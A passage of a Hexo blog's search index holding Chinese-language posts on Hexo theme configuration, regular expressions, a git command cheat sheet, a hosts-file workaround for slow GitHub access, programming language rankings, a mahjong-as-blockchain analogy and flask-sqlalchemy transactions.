&#125;&#125;&lt;/a&gt;</span><br><span class="line">       &lt;/li&gt;</span><br><span class="line">     &#123;% endfor %&#125;</span><br><span class="line">   &lt;/ul&gt;</span><br><span class="line"> &lt;/div&gt;</span><br></pre></td></tr></table></figure>
<h1 id="修改hexo主题的-config-yml"><a href="#修改hexo主题的-config-yml" class="headerlink" title="修改hexo主题的_config.yml"></a>修改hexo主题的_config.yml</h1><p>结尾加上如下代码<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">recent_posts_title: 近期文章</span><br><span class="line">recent_posts_layout: block</span><br><span class="line">recent_posts: true</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo近期文章</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo next主题如何添加搜索功能？</title>
    <url>/2020/02/12/hexo-1/</url>
    <content><![CDATA[<p>一键添加搜索功能<br><a id="more"></a></p>
<h1 id="安装模块"><a href="#安装模块" class="headerlink" title="安装模块"></a>安装模块</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure>
<h1 id="效果截图"><a href="#效果截图" class="headerlink" title="效果截图"></a>效果截图</h1><p><img src="https://i.loli.net/2020/02/12/IfnJeMqDtxiBX1C.png" alt="next 搜索功能"></p>
<h1 id="参数设定"><a href="#参数设定" class="headerlink" title="参数设定"></a>参数设定</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">local_search:</span><br><span class="line">  enable: true </span><br><span class="line">  # if auto, trigger search by changing input</span><br><span class="line">  # if manual, trigger search by pressing enter key or search button</span><br><span class="line">  # 是否自动出结果还是手动搜索</span><br><span class="line">  trigger: auto</span><br><span class="line">  # show top n results per article, show all results by setting to -1</span><br><span class="line">  # 显示搜索结果的行数</span><br><span class="line">  top_n_per_article: 1</span><br><span class="line">  # unescape html strings to the readable one</span><br><span class="line">  unescape: false</span><br><span class="line">  # unescape html字符串可读</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo搜索</tag>
      </tags>
  </entry>
  <entry>
    <title>如何杜绝一句话需求？程序员如何将不合理的需求合理的怼回去？</title>
    <url>/2020/02/12/coding-2/</url>
    <content><![CDATA[<p>程序员如何将不合理的需求合理的怼回去？<br><a id="more"></a></p>
<blockquote>
<p>如何杜绝一句话需求？首先我们来看看什么是一句话需求：<br>“把这个视觉稿还原下，明天交付给产品”<br>“这个开放接口再增加一个额外的开放功能，给外包场景使用”<br>“给我跑一个数据报表，分析下近期的用户行为”<br>“把这个 Icon 调大一点”</p>
</blockquote>
<p>我们经常会提到用户故事这个词，从用户故事中会抽离出一些业务上和技术上的需求，然后针对需求做细分产生一系列任务。很多一句话需求就像是一个任务，没有背景，没有分析，没有评审，直接扔过来交给你，此时你的角色只是一个简单的执行者。</p>
<p>那如何杜绝呢？有两个策略，最常见的是，给需求加要求：</p>
<ul>
<li><p>没有详细背景的需求不接</p>
</li>
<li><p>看不到业务价值的需求不接</p>
</li>
<li><p>没有数据预期的需求不接</p>
</li>
<li><p>频繁更改的需求不接</p>
</li>
</ul>
<p>这种策略是一种守的姿态来应对“外部刺激”，很被动，倘若拒绝得过于粗暴还不利于与合作方的长期共存。给偏爱使用这种策略的同学几点建议：</p>
<p><strong>首先，不能说不（Never say no）</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">你应该说“好，我接受，但是……”，注意这里的但是</span><br><span class="line"></span><br><span class="line">“我不保证质量/我不保证时间/我既不保证质量也不保证时间”</span><br><span class="line"></span><br><span class="line">“除非，你砍点需求/延长点时间”</span><br></pre></td></tr></table></figure></p>
<p>此时，再和谐地抛出你的要求：能不能先想清楚业务价值，能不能给一个确定不改的需求，能不能给出数据预期等等</p>
<p>通过这种委婉且合理又不伤感情的方式，倒逼需求方按照你的要求做事情，这是一种“守”的策略。另一种策略是“攻”，主动出击，梳理自己的问题和需求方的目标，深入敌方：</p>
<p>目前我的系统存在哪些问题，安全、性能、稳定性、可拓展性等，确定最致命问题</p>
<p>需求方的长期目标是什么，阶段性目标是什么，近期目标是什么</p>
<p>从长期来看，我的系统需要沉淀什么能力来应对需求方</p>
<p>需求方提过来的需求要实现他哪个阶段目标，他提的需求是否真的可以实现他的目标，他是如何分析的，我结合他的分析能否得出同样的结论</p>
<p>为什么他总是会提出一句话需求，他的需求源是从哪里来的，他的老板？他的客户？他的合作伙伴？</p>
<p>能不能让他的需求源在给他传递消息的同时也传递给我，至少让我知道他消化需求的姿势是正确的，对需求源的理解没有偏差</p>
<p><strong>兵家有云，知己知彼方能百战百胜，把己方的问题和需求方的问题都分析的妥妥的，然后按计划办事，经过一段时间的自我消化和自我调整，自然可以很好的扼制住如洪水般的需求。换一种说法就是，你要学会帮助需求方更好地分析问题，这个要求很高，需要你对业务有足够的理解和判断。</strong></p>
<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/02/12/program-rank/">2019 program language rank,2019年编程语言排名</a></li><li><a href="https://thelighter.github.io/2020/01/05/coding/">面对行业的萧条如何自救</a></li></ul></div>]]></content>
      <categories>
        <category>编程生涯</category>
      </categories>
      <tags>
        <tag>编程生涯</tag>
      </tags>
  </entry>
  <entry>
    <title>python re最新教程，一看就会</title>
    <url>/2020/02/12/re-learn/</url>
    <content><![CDATA[<p>正则表达式re最全教程<br><a id="more"></a></p>
<h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><p>一个正则表达式是一种从左到右匹配主体字符串的模式。 “Regular expression”这个词比较拗口，我们常使用缩写的术语“regex”或“regexp”。 正则表达式可以从一个基础字符串中根据一定的匹配模式替换文本中的字符串、验证表单、提取字符串等等。</p>
<p><img src="https://github.com/ziishaned/learn-regex/raw/master/img/regexp-cn.png" alt></p>
<h1 id="正则表达式常用符号"><a href="#正则表达式常用符号" class="headerlink" title="正则表达式常用符号"></a>正则表达式常用符号</h1><table>
<thead>
<tr>
<th style="text-align:center">元字符</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">.</td>
<td>句号匹配任意单个字符除了换行符。</td>
</tr>
<tr>
<td style="text-align:center">[ ]</td>
<td>字符种类。匹配方括号内的任意字符。</td>
</tr>
<tr>
<td style="text-align:center">[^ ]</td>
<td>否定的字符种类。匹配除了方括号里的任意字符</td>
</tr>
<tr>
<td style="text-align:center">*</td>
<td>匹配&gt;=0个重复的在*号之前的字符。</td>
</tr>
<tr>
<td style="text-align:center">+</td>
<td>匹配&gt;=1个重复的+号前的字符。</td>
</tr>
<tr>
<td style="text-align:center">?</td>
<td>标记?之前的字符为可选.</td>
</tr>
<tr>
<td style="text-align:center">{n,m}</td>
<td>匹配num个大括号之间的字符 (n &lt;= num &lt;= m).</td>
</tr>
<tr>
<td style="text-align:center">(xyz)</td>
<td>字符集，匹配与 xyz 完全相等的字符串.</td>
</tr>
<tr>
<td style="text-align:center">&#124;</td>
<td>或运算符，匹配符号前或后的字符.</td>
</tr>
<tr>
<td style="text-align:center">&#92;</td>
<td>转义字符,用于匹配一些保留的字符 <code>[ ] ( ) { } . * + ? ^ $ \ &#124;</code></td>
</tr>
<tr>
<td style="text-align:center">^</td>
<td>从开始行开始匹配.</td>
</tr>
<tr>
<td style="text-align:center">$</td>
<td>从末端开始匹配.</td>
</tr>
</tbody>
</table>
<h1 id="正则表达式提供一些常用的字符集简写"><a href="#正则表达式提供一些常用的字符集简写" class="headerlink" title="正则表达式提供一些常用的字符集简写"></a>正则表达式提供一些常用的字符集简写</h1><table>
<thead>
<tr>
<th style="text-align:center">简写</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">.</td>
<td>除换行符外的所有字符</td>
</tr>
<tr>
<td style="text-align:center">\w</td>
<td>匹配所有字母数字，等同于 <code>[a-zA-Z0-9_]</code></td>
</tr>
<tr>
<td style="text-align:center">\W</td>
<td>匹配所有非字母数字，即符号，等同于： <code>[^\w]</code></td>
</tr>
<tr>
<td style="text-align:center">\d</td>
<td>匹配数字： <code>[0-9]</code></td>
</tr>
<tr>
<td style="text-align:center">\D</td>
<td>匹配非数字： <code>[^\d]</code></td>
</tr>
<tr>
<td style="text-align:center">\s</td>
<td>匹配所有空格字符，等同于： <code>[\t\n\f\r\p{Z}]</code></td>
</tr>
<tr>
<td style="text-align:center">\S</td>
<td>匹配所有非空格字符： <code>[^\s]</code></td>
</tr>
<tr>
<td style="text-align:center">\f</td>
<td>匹配一个换页符</td>
</tr>
<tr>
<td style="text-align:center">\n</td>
<td>匹配一个换行符</td>
</tr>
<tr>
<td style="text-align:center">\r</td>
<td>匹配一个回车符</td>
</tr>
<tr>
<td style="text-align:center">\t</td>
<td>匹配一个制表符</td>
</tr>
<tr>
<td style="text-align:center">\v</td>
<td>匹配一个垂直制表符</td>
</tr>
<tr>
<td style="text-align:center">\p</td>
<td>匹配 CR/LF（等同于 <code>\r\n</code>），用来匹配 DOS 行终止符</td>
</tr>
</tbody>
</table>
<h1 id="re标志"><a href="#re标志" class="headerlink" title="re标志"></a>re标志</h1><table>
<thead>
<tr>
<th style="text-align:center">标志</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">i</td>
<td>忽略大小写。</td>
</tr>
<tr>
<td style="text-align:center">g</td>
<td>全局搜索。</td>
</tr>
<tr>
<td style="text-align:center">m</td>
<td>多行修饰符：锚点元字符 <code>^</code> <code>$</code> 工作范围在每行的起始。</td>
</tr>
</tbody>
</table>
<p>索。</p>
<p>表达式 <code>/The/gi</code> 表示在全局搜索 <code>The</code>，在后面的 <code>i</code> 将其条件修改为忽略大小写，则变成搜索 <code>the</code> 和 <code>The</code>，<code>g</code> 表示全局搜索</p>
<pre>
"/The/gi" => <a href="#learn-regex"><strong>The</strong></a> fat cat sat on <a href="#learn-regex"><strong>the</strong></a> mat.
</pre>
修饰符 `g` 常用于执行一个全局搜索匹配，即（不仅仅返回第一个匹配的，而是返回全部）。
例如，表达式 `/.(at)/g` 表示搜索 任意字符（除了换行）+ `at`，并返回全部结果。

<pre>
"/.(at)/" => The <a href="#learn-regex"><strong>fat</strong></a> cat sat on the mat.
</pre>
多行修饰符 `m` 常用于执行一个多行匹配。

像之前介绍的 `(^,$)` 用于检查格式是否是在待检测字符串的开头或结尾。但我们如果想要它在每行的开头和结尾生效，我们需要用到多行修饰符 `m`。

例如，表达式 `/at(.)?$/gm` 表示小写字符 `a` 后跟小写字符 `t` ，末尾可选除换行符外任意字符。根据 `m` 修饰符，现在表达式匹配每行的结尾。

<pre>
"/.at(.)?$/" => The fat
                cat sat
                on the <a href="#learn-regex"><strong>mat.</strong></a>
</pre>

]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>re用法</tag>
      </tags>
  </entry>
  <entry>
    <title>世界上最早的区块链——中国麻将</title>
    <url>/2020/02/12/blockchain-1/</url>
    <content><![CDATA[<p>世界上最早的区块链项目——中国麻将<br><a id="more"></a></p>
<h1 id="中国麻将"><a href="#中国麻将" class="headerlink" title="中国麻将"></a>中国麻将</h1><p>中国麻将有144张牌，通过四个人去进行这局麻将。</p>
<p>甲首先发起一个申请，我要打麻将，组建一个麻将局，这就相当于创建一个区块，这个区块会被广播给乙、丙、丁、A、B、C、D……</p>
<p>在打麻将的过程中，上述四个人不断的 摸牌、打牌，这个可以理解成挖矿，通过什么来挖矿？麻将机就可以理解成矿机，这四个人就是所谓的矿工，这四个矿工从144个麻将中碰撞出任一正确的牌就能胡牌，我们可以将这144个麻将理解成一连串的哈希值（数字），胡牌的过程就叫算力，直到胡牌，意味着碰撞出了正确的哈希值，可以获得奖励，每人给丙支付相应的筹码，放在区块链中这个奖励就是比特币或者其他虚拟币。</p>
<p>为什么其他三个人都会主动给丙奖励呢？那是因为这些人都自动达成了一个共识，丙确实赢了，大家都记录了这笔账，包括坐在旁边买马或者围观的家属看客们，想抵赖是不行的，不然以后传出去这人品不行，就没人再和他一起玩儿了，毕竟圈子还是很重要的。</p>
<pre><code>细究一下，在大家达成共识时，我们看不到任何中介或者第三方出来评判丙赢了，大家给丙的奖励也不需要通过第三方转交给丙，都是直接点对点交易，这一过程就是去中心化，牌友们（矿工）各自记录了第一局的战绩，丙大胡自摸十三幺，乙杠了甲东风，记录完成后就生成了一个完整的区块，但要记住，这才只是第一局，在整个区块链上，这才仅仅是一个节点，开头说的8局打完，也就是8个节点（区块），8个区块连接在一起就形成了一个完整账本，这就是区块链。因为这个账本每人都有一个，所以就是分布式账本，目的就是为了防止有人篡改记录，打到最后，谁输谁赢一目了然。
</code></pre><p>————————————————<br>版权声明：本文为CSDN博主「gao_chun」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/gao_chun/article/details/102795414" target="_blank" rel="noopener">https://blog.csdn.net/gao_chun/article/details/102795414</a></p>
]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>2019 program language rank</title>
    <url>/2020/02/12/program-rank-en/</url>
    <content><![CDATA[<p>Which programming languages ​​are the most popular in 2019? Which framework is most popular in 2019? Which programming language has the highest salary in 2019?<br><a id="more"></a></p>
<h1 id="2019-programming-language-summary"><a href="#2019-programming-language-summary" class="headerlink" title="2019 programming language summary"></a>2019 programming language summary</h1><p>In 2019, programming languages ​​have emerged endlessly, such as the V language or other niche programming languages, but none of them can touch the forefront of the old languages-JavaScript, java, c, and python. They are the backbone of the Internet and the entire virtual world.</p>
<h2 id="Most-Popular-Language-Ranking"><a href="#Most-Popular-Language-Ranking" class="headerlink" title="Most Popular Language Ranking"></a>Most Popular Language Ranking</h2><p><img src="https://i.loli.net/2020/02/12/JFdWIqZxifPCKy2.jpg" alt="1569741922263206.jpg"></p>
<p>rust, python, typescript, kotlin, and webassembly became the top five.<br>The high performance of rust is used in the development of Facebook’s libra virtual currency, which forms the entire libra trading system and connects the world’s economy. Python is well received in the field of artificial intelligence. Typescript is of great significance for JavaScript development.</p>
<h2 id="Ranking-of-programming-language-frameworks"><a href="#Ranking-of-programming-language-frameworks" class="headerlink" title="Ranking of programming language frameworks"></a>Ranking of programming language frameworks</h2><p><img src="https://i.loli.net/2020/02/12/LT5i4B8zjdDGvrR.jpg" alt="1569741923348894.jpg"></p>
<p>jQuery deserves to be the most widely used framework, with hundreds of millions of users using this framework to complete basic html page construction.</p>
<p>React is widely praised as a progressive application development framework.</p>
<h2 id="Programming-salary-ranking"><a href="#Programming-salary-ranking" class="headerlink" title="Programming salary ranking"></a>Programming salary ranking</h2><p><img src="https://i.loli.net/2020/02/12/ZhcvadbMFqSfY9m.jpg" alt="1569741929407547.jpg"></p>
<p>Java has become the lowest paid programming language. It is really surprising that there may be a large number of employees in Java, and Java can no longer meet the requirements of the times.</p>
]]></content>
      <categories>
        <category>programming career</category>
      </categories>
      <tags>
        <tag>programming career</tag>
      </tags>
  </entry>
  <entry>
    <title>2019 program language rank,2019年编程语言排名</title>
    <url>/2020/02/12/program-rank/</url>
    <content><![CDATA[<p>2019年哪们编程语言最受欢迎？2019年哪个框架最受欢迎？2019年哪们编程语言工资最高？<br><a id="more"></a></p>
<h1 id="2019年编程语言总结"><a href="#2019年编程语言总结" class="headerlink" title="2019年编程语言总结"></a>2019年编程语言总结</h1><p>2019年，编程语言层出不穷，比如v语言或者其他的小众的编程语言，但是都无法触动排行在前列的老牌语言——JavaScript、java、c和python等，他们是互联网和整个虚拟世界的顶梁柱。</p>
<h2 id="最受欢迎的语言排名"><a href="#最受欢迎的语言排名" class="headerlink" title="最受欢迎的语言排名"></a>最受欢迎的语言排名</h2><p><img src="https://i.loli.net/2020/02/12/JFdWIqZxifPCKy2.jpg" alt="1569741922263206.jpg"></p>
<p>rust、python、typescript、kotlin和webassembly成为了前五名。<br>rust的高性能被应用于Facebook的libra虚拟币开发，组成了整个libra交易系统，联通了世界的经济。python在人工智能领域广受好评。typescript对于JavaScript开发来说有着巨大的意义。</p>
<h2 id="编程语言框架排名"><a href="#编程语言框架排名" class="headerlink" title="编程语言框架排名"></a>编程语言框架排名</h2><p><img src="https://i.loli.net/2020/02/12/LT5i4B8zjdDGvrR.jpg" alt="1569741923348894.jpg"></p>
<p>jQuery当之无愧是最为广泛使用的框架，有上亿用户在使用这个框架完成基本的html页面的建设。</p>
<p>react作为渐进式应用开发框架，广受好评。</p>
<h2 id="编程薪资排名"><a href="#编程薪资排名" class="headerlink" title="编程薪资排名"></a>编程薪资排名</h2><p><img src="https://i.loli.net/2020/02/12/ZhcvadbMFqSfY9m.jpg" alt="1569741929407547.jpg"></p>
<p>Java成为了工资最低的编程语言，实在令人惊讶，可能Java的从业人数较多，Java已经不能适合时代的要求了。</p>
<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/02/12/coding-2/">如何杜绝一句话需求？程序员如何将不合理的需求合理的怼回去？</a></li><li><a href="https://thelighter.github.io/2020/01/05/coding/">面对行业的萧条如何自救</a></li></ul></div>]]></content>
      <categories>
        <category>编程生涯</category>
      </categories>
      <tags>
        <tag>编程生涯</tag>
      </tags>
  </entry>
  <entry>
    <title>git clone和push速度慢如何解决</title>
    <url>/2020/02/11/git-4/</url>
    <content><![CDATA[<p>原因：git clone特别慢是因为github.global.ssl.fastly.net域名被限制<br><a id="more"></a></p>
<h1 id="解决思路"><a href="#解决思路" class="headerlink" title="解决思路"></a>解决思路</h1><p>在本地中将域名指向新的Ip地址，绕过域名被墙</p>
<h1 id="windows解决办法"><a href="#windows解决办法" class="headerlink" title="windows解决办法"></a>windows解决办法</h1><p>C:\Windows\System32\drivers\etc\hosts<br>中加上<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">github.com 13.229.188.59</span><br><span class="line">github.global.ssl.fastly.Net 151.101.229.194</span><br></pre></td></tr></table></figure></p>
<h1 id="Linux解决办法"><a href="#Linux解决办法" class="headerlink" title="Linux解决办法"></a>Linux解决办法</h1><p>sudo vi /etc/hosts</p>
<p>在hosts文件末尾添加两行</p>
<p>github.com 13.229.188.59<br>github.global.ssl.fastly.Net 151.101.229.194</p>
<h1 id="刷新DNS解析缓存"><a href="#刷新DNS解析缓存" class="headerlink" title="刷新DNS解析缓存"></a>刷新DNS解析缓存</h1><p>Linux：</p>
<p>sudo /etc/init.d/networking restart</p>
<p>Windows：</p>
<p>ipconfig /flushdns</p>
<p>Mac：</p>
<p>sudo killall -HUP mDNSResponder</p>
]]></content>
      <categories>
        <category>git</category>
      </categories>
  </entry>
  <entry>
    <title>git必会命令大全</title>
    <url>/2020/02/11/git-3/</url>
    <content><![CDATA[<p>git命令总结<br><a id="more"></a></p>
<p>git init                                                  # 初始化本地git仓库（创建新仓库）<br>git config –global user.name “xxx”                       # 配置用户名<br>git config –global user.email “<a href="mailto:xxx@xxx.com" target="_blank" rel="noopener">xxx@xxx.com</a>“              # 配置邮件<br>git config –global color.ui true                         # git status等命令自动着色<br>git config –global color.status auto<br>git config –global color.diff auto<br>git config –global color.branch auto<br>git config –global color.interactive auto<br>git config –global –unset http.proxy                    # remove  proxy configuration on git<br>git clone git+ssh:<a href="mailto://git@192.168.53.168" target="_blank" rel="noopener">//git@192.168.53.168</a>/VT.git             # clone远程仓库<br>git status                                                # 查看当前版本状态（是否修改）<br>git add xyz                                               # 添加xyz文件至index<br>git add .                                                 # 增加当前子目录下所有更改过的文件至index<br>git commit -m ‘xxx’                                       # 提交<br>git commit –amend -m ‘xxx’                               # 合并上一次提交（用于反复修改）<br>git commit -am ‘xxx’                                      # 将add和commit合为一步<br>git rm xxx                                                # 删除index中的文件<br>git rm -r *                                               # 递归删除<br>git log                                                   # 显示提交日志<br>git log -1                                                # 显示1行日志 -n为n行<br>git log -5<br>git log –stat                                            # 显示提交日志及相关变动文件<br>git log -p -m<br>git show dfb02e6e4f2f7b573337763e5c0013802e392818         # 显示某个提交的详细内容<br>git show dfb02                                            # 可只用commitid的前几位<br>git show HEAD                                             # 显示HEAD提交日志<br>git show HEAD^                                            # 显示HEAD的父（上一个版本）的提交日志 ^^为上两个版本 ^5为上5个版本<br>git tag                                                   # 显示已存在的tag<br>git tag -a v2.0 -m ‘xxx’                                  # 增加v2.0的tag<br>git show v2.0                                             # 显示v2.0的日志及详细内容<br>git log v2.0                                              # 显示v2.0的日志<br>git diff                                                  # 显示所有未添加至index的变更<br>git diff –cached                                         # 显示所有已添加index但还未commit的变更<br>git diff HEAD^                                            # 比较与上一个版本的差异<br>git diff HEAD – ./lib                                    # 比较与HEAD版本lib目录的差异<br>git diff origin/master..master                            # 比较远程分支master上有本地分支master上没有的<br>git diff origin/master..master –stat                     # 只显示差异的文件，不显示具体内容<br>git remote add origin git+ssh:<a href="mailto://git@192.168.53.168" target="_blank" rel="noopener">//git@192.168.53.168</a>/VT.git # 增加远程定义（用于push/pull/fetch）<br>git branch                                                # 显示本地分支<br>git branch –contains 50089                               # 显示包含提交50089的分支<br>git branch -a                                             # 显示所有分支<br>git branch -r                                             # 显示所有原创分支<br>git branch –merged                                       # 显示所有已合并到当前分支的分支<br>git branch –no-merged                                    # 显示所有未合并到当前分支的分支<br>git branch -m master master_copy                          # 本地分支改名<br>git checkout -b master_copy                               # 从当前分支创建新分支master_copy并检出<br>git checkout -b master master_copy                        # 上面的完整版<br>git checkout features/performance                         # 检出已存在的features/performance分支<br>git checkout –track hotfixes/BJVEP933                    # 检出远程分支hotfixes/BJVEP933并创建本地跟踪分支<br>git checkout v2.0                                         # 检出版本v2.0<br>git checkout -b devel origin/develop                      # 从远程分支develop创建新本地分支devel并检出<br>git checkout – README                                    # 检出head版本的README文件（可用于修改错误回退）<br>git merge origin/master                                   # 合并远程master分支至当前分支<br>git cherry-pick ff44785404a8e                             # 合并提交ff44785404a8e的修改<br>git push origin master                                    # 将当前分支push到远程master分支<br>git push origin :hotfixes/BJVEP933                        # 删除远程仓库的hotfixes/BJVEP933分支<br>git push –tags                                           # 把所有tag推送到远程仓库<br>git fetch                                                 # 获取所有远程分支（不更新本地分支，另需merge）<br>git fetch –prune                                         # 获取所有原创分支并清除服务器上已删掉的分支<br>git pull origin master                                    # 获取远程分支master并merge到当前分支<br>git mv README README2                                     # 重命名文件README为README2<br>git reset –hard HEAD                                     # 将当前版本重置为HEAD（通常用于merge失败回退）<br>git rebase<br>git branch -d hotfixes/BJVEP933                           # 删除分支hotfixes/BJVEP933（本分支修改已合并到其他分支）<br>git branch -D hotfixes/BJVEP933                           # 强制删除分支hotfixes/BJVEP933<br>git ls-files                                              # 列出git index包含的文件<br>git show-branch                                           # 图示当前分支历史<br>git show-branch –all                                     # 图示所有分支历史<br>git whatchanged                                           # 显示提交历史对应的文件修改<br>git revert dfb02e6e4f2f7b573337763e5c0013802e392818       # 撤销提交dfb02e6e4f2f7b573337763e5c0013802e392818<br>git ls-tree HEAD                                          # 内部命令：显示某个git对象<br>git rev-parse v2.0                                        # 内部命令：显示某个ref对于的SHA1 HASH<br>git reflog                                                # 显示所有提交，包括孤立节点<br>git show HEAD@{5}<br>git show master@{yesterday}                               # 显示master分支昨天的状态<br>git log –pretty=format:’%h %s’ –graph                   # 图示提交日志<br>git show HEAD~3<br>git show -s –pretty=raw 2be7fcb476<br>git stash                                                 # 暂存当前修改，将所有至为HEAD状态<br>git stash list                                            # 查看所有暂存<br>git stash show -p stash@{0}                               # 参考第一次暂存<br>git stash apply stash@{0}                                 # 应用第一次暂存<br>git grep “delete from”                                    # 文件中搜索文本“delete from”<br>git grep -e ‘#define’ –and -e SORT_DIRENT<br>git gc<br>git fsck</p>
]]></content>
      <categories>
        <category>git</category>
      </categories>
      <tags>
        <tag>git大全</tag>
      </tags>
  </entry>
  <entry>
    <title>2020年最新flask-sqlalchemy用法总结(2)</title>
    <url>/2020/02/11/flask-sqlalchemy2/</url>
    <content><![CDATA[<p>最全的flask-sqlalchemy用法总结<br><a id="more"></a></p>
<h1 id="SQLAlchemy常用数据类型"><a href="#SQLAlchemy常用数据类型" class="headerlink" title="SQLAlchemy常用数据类型"></a>SQLAlchemy常用数据类型</h1><p>Integer：整形，映射到数据库中是int类型。<br>Float：浮点类型，映射到数据库中是float类型。他占据的32位。<br>Double：双精度浮点类型，映射到数据库中是double类型，占据64位。<br>String：可变字符类型，映射到数据库中是varchar类型.<br>Boolean：布尔类型，映射到数据库中的是tinyint类型。<br>DECIMAL：定点类型。是专门为了解决浮点类型精度丢失的问题的。<br>Enum：枚举类型。指定某个字段只能是枚举中指定的几个值，不能为其他值。在ORM模型中，使用<br>Date：存储时间，只能存储年月日。映射到数据库中是date类型<br>DateTime：存储时间，可以存储年月日时分秒毫秒等<br>Time：存储时间，可以存储时分秒。映射到数据库中也是time类型<br>Text：存储长字符串。一般可以存储6W多个字符<br>LONGTEXT：长文本类型，映射到数据库中是longtext类型</p>
<ul>
<li>Enum：枚举类型用法<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">class TagEnum(enum.Enum):</span><br><span class="line">    python = &quot;python&quot;</span><br><span class="line">    flask = &quot;flask&quot;</span><br><span class="line">    django = &quot;django&quot;</span><br><span class="line"></span><br><span class="line">class Article(Base):</span><br><span class="line">    __tablename__ = &apos;article&apos;</span><br><span class="line">    id = Column(Integer,primary_key=True,autoincrement=True)</span><br><span class="line">    tag = Column(Enum(TagEnum))</span><br></pre></td></tr></table></figure>
</li>
</ul>
<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/04/25/flask-sqlalchemy-3/">sqlalchemy时间过滤How to filter date field?</a></li><li><a href="https://thelighter.github.io/2020/02/11/flask-sqlalchemy/">2020年最新flask-sqlalchemy用法总结(1)</a></li><li><a href="https://thelighter.github.io/2020/02/07/flask-time/">如何在Flask_sqlalchemy中查询时间段或者时间点？</a></li></ul></div>]]></content>
      <categories>
        <category>flask-sqlalchemy</category>
      </categories>
      <tags>
        <tag>flask-sqlalchemy</tag>
      </tags>
  </entry>
  <entry>
    <title>2020年最新flask-sqlalchemy用法总结(1)</title>
    <url>/2020/02/11/flask-sqlalchemy/</url>
    <content><![CDATA[<p>flask-sqlalchemy一看就会<br><a id="more"></a></p>
<h1 id="flush和commit区别"><a href="#flush和commit区别" class="headerlink" title="flush和commit区别"></a>flush和commit区别</h1><pre><code>flush: 写数据库，但不提交，也就是事务未结束
commit: 是先调用flush写数据库，然后提交，结束事务，并开始新的事务
</code></pre><h1 id="scoped-session"><a href="#scoped-session" class="headerlink" title="scoped_session"></a>scoped_session</h1><p>通常我们用 SQLAlchemy 写数据的时候要创建 Session 对象来维护数据库会话，用完了再关掉。但是这种在web大量的请求的情况下，会出现线程不安全的情况<br>设置session时，需要指定为scoped_session,目的是session可以共享（ThreadLocal）<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 对于alchemy</span><br><span class="line">from sqlalchemy.orm import sessionmaker, scoped_session</span><br><span class="line">scoped_session(sessionmaker(bind=engine))</span><br></pre></td></tr></table></figure></p>
<h1 id="开启alchemy子事务"><a href="#开启alchemy子事务" class="headerlink" title="开启alchemy子事务"></a>开启alchemy子事务</h1><p><code>session.begin(subtransactions=True)</code></p>
<h1 id="数据库acid特性总结"><a href="#数据库acid特性总结" class="headerlink" title="数据库acid特性总结"></a>数据库acid特性总结</h1><h2 id="什么是事务"><a href="#什么是事务" class="headerlink" title="什么是事务"></a>什么是事务</h2><p>事务是应用程序中一系列逻辑相关的操作，所有操作必须成功完成，否则在每个操作中所作的所有更改都会被撤消。也就是事务具有原子性：一个事务中的一系列的操作要么全部成功，要么一个都不做。<br>事务的结束有两种，当事务中的所以步骤全部成功执行时，事务提交。如果其中一个步骤失败，将发生回滚操作，撤消之前的所有操作。<br>在mysql的执行引擎当中只有innoDB支持事务，可以通过 “show engines；”查看。</p>
<h2 id="事务的-ACID"><a href="#事务的-ACID" class="headerlink" title="事务的 ACID"></a>事务的 ACID</h2><p>事务具有四个特征：原子性（ Atomicity ）、一致性（ Consistency ）、隔离性（ Isolation ）和持久性（ Durability ）。这四个特性简称为 ACID 特性。<br>1 、原子性<br>事务是数据库的逻辑工作单位，不可分割，事务中包含的各操作要么都做，要么都不做<br>2 、一致性<br>事务执行的结果必须是使数据库从一个一致性状态变到另一个一致性状态。因此当数据库只包含成功事务提交的结果时，就说数据库处于一致性状态。如果数据库系统 运行中发生故障，有些事务尚未完成就被迫中断，这些未完成事务对数据库所做的修改有一部分已写入物理数据库，这时数据库就处于一种不正确的状态，或者说是 不一致的状态。<br>3 、隔离性<br>一个事务的执行不能其它事务干扰。即一个事务内部的操作及使用的数据对其它并发事务是隔离的，并发执行的各个事务之间不能互相干扰。 事务的隔离级别有4级<br>4 、持续性<br>也称永久性，指一个事务一旦提交，它对数据库中的数据的改变就应该是永久性的，不能回滚。接下来的其它操作或故障不应该对其执行结果有任何影响。</p>
<h1 id="MYSQL的事务处理主要有两种方法。"><a href="#MYSQL的事务处理主要有两种方法。" class="headerlink" title="MYSQL的事务处理主要有两种方法。"></a>MYSQL的事务处理主要有两种方法。</h1><h2 id="用BEGIN-ROLLBACK-COMMIT来实现"><a href="#用BEGIN-ROLLBACK-COMMIT来实现" class="headerlink" title="用BEGIN,ROLLBACK,COMMIT来实现"></a>用BEGIN,ROLLBACK,COMMIT来实现</h2><pre><code>开始：START TRANSACTION或BEGIN语句可以开始一项新的事务
提交：COMMIT可以提交当前事务，是变更成为永久变更
回滚：ROLLBACK可以回滚当前事务，取消其变更
